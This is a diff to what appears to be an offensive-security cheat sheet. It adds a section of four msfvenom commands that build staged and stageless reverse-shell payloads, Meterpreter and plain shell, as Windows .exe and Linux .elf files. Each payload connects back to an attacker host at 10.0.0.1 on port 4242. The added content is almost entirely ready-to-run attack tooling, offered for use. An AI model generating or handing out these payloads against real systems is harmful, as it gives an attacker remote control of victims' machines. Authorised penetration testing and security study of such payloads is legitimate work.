@@ -2,6 +2,32 @@
 
 ## Operating System Payloads
 
+## Staged and Stageless
+
+Windows Staged reverse TCP
+
+```text
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+```
+
+Windows Stageless reverse TCP
+
+```text
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+```
+
+Linux Staged reverse TCP
+
+```text
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+```
+
+Linux Stageless reverse TCP
+
+```text
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+```
+
 ### Windows Payloads <a id="windows-payloads"></a>
 
 ```text
